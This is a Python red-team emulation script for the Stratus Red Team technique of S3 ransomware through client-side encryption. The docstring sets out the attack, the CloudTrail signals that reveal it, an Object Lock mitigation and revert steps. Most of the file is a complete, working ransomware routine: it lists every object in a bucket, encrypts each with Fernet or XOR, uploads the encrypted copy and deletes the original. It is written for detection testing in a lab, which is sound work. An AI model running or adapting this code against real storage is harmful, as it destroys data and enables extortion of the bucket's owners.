"""
Technique : aws.impact.s3-ransomware-client-side-encryption
Tactic    : Impact (T1486)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.impact.s3-ransomware-client-side-encryption/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target S3 bucket with objects.
  - pip install cryptography  (for Fernet symmetric encryption)

How the attack works:
  A ransomware operator downloads each S3 object, encrypts it client-side using
  a symmetric key (Fernet/AES-128-CBC), re-uploads the encrypted version with a
  ".encrypted" suffix, and deletes the original.  The victim loses access to all
  data unless the attacker provides the decryption key (typically after payment).

Detection signal:
  - CloudTrail pattern: GetObject → PutObject (new key ending in .encrypted) →
    DeleteObject for the same object — repeated for every file.
  - S3 Object Lock prevents DeleteObject from succeeding.

Revert:
  - Encrypted objects remain in the bucket (originals are deleted).
  - Run `pulumi destroy && pulumi up` to recreate the bucket and objects.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


def encrypt_bytes(data: bytes, key: bytes) -> bytes:
    """XOR encryption as a lightweight alternative if cryptography is unavailable."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def get_encryptor():
    """Return (encrypt_fn, key_description). Prefers Fernet; falls back to XOR."""
    try:
        from cryptography.fernet import Fernet
        key = Fernet.generate_key()
        f   = Fernet(key)
        print(f"  [+] Using Fernet (AES-128-CBC) encryption")
        print(f"  [+] Encryption key (save this!): {key.decode()}")
        return f.encrypt, "Fernet"
    except ImportError:
        key = os.urandom(32)
        print("  [~] cryptography not installed — using XOR cipher (install with: pip install cryptography)")
        print(f"  [+] XOR key (hex): {key.hex()}")
        return lambda data: encrypt_bytes(data, key), "XOR"


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir   = str(Path(__file__).parent.parent / "infra")
    infra       = get_pulumi_outputs(stack_dir)
    bucket_name = infra.get("bucket_name", "")

    if not bucket_name:
        print("[!] bucket_name not found in Pulumi outputs. Did you run `pulumi up`?")
        return

    session   = boto3.Session()
    s3_client = session.client("s3")

    # ── Step 0: Set up encryption ─────────────────────────────────────────────
    banner("Step 0 — Prepare encryption key")
    encrypt_fn, cipher_name = get_encryptor()

    # ── Step 1: Enumerate all objects ─────────────────────────────────────────
    banner("Step 1 — Enumerate objects (ListObjectsV2)")
    all_keys: list[str] = []
    paginator = s3_client.get_paginator("list_objects_v2")
    for page in paginator.paginate(Bucket=bucket_name):
        for obj in page.get("Contents", []):
            if not obj["Key"].endswith(".encrypted"):
                all_keys.append(obj["Key"])

    print(f"  [+] Found {len(all_keys)} object(s) to encrypt in: {bucket_name}")
    if not all_keys:
        print("  [~] No objects to encrypt.")
        return

    # ── Step 2: Encrypt each object ───────────────────────────────────────────
    banner(f"Step 2 — Encrypt {len(all_keys)} objects ({cipher_name}): GetObject + PutObject + DeleteObject")
    encrypted_count = 0
    error_count     = 0

    for key in all_keys:
        encrypted_key = key + ".encrypted"
        try:
            # Download
            obj_data = s3_client.get_object(Bucket=bucket_name, Key=key)
            plaintext = obj_data["Body"].read()

            # Encrypt
            ciphertext = encrypt_fn(plaintext)

            # Re-upload encrypted version
            s3_client.put_object(
                Bucket=bucket_name,
                Key=encrypted_key,
                Body=ciphertext,
            )

            # Delete original
            s3_client.delete_object(Bucket=bucket_name, Key=key)

            encrypted_count += 1
            if encrypted_count % 10 == 0:
                print(f"  [+] Encrypted {encrypted_count}/{len(all_keys)}: {key} -> {encrypted_key}")

        except ClientError as exc:
            error_count += 1
            print(f"  [!] Failed on {key}: {exc}")

    banner("Complete")
    print(f"  Objects encrypted : {encrypted_count}")
    print(f"  Errors            : {error_count}")
    print()
    print(f"CloudTrail events per object: s3:GetObject + s3:PutObject + s3:DeleteObject")
    print(f"Total CloudTrail events: {encrypted_count * 3}")
    print("\nDetection guidance:")
    print("  Alert on GetObject + PutObject (new key) + DeleteObject pattern")
    print("  repeating across many objects in rapid succession.")
    print("\nRun `pulumi destroy && pulumi up` to recreate the bucket and objects.")


if __name__ == "__main__":
    main()
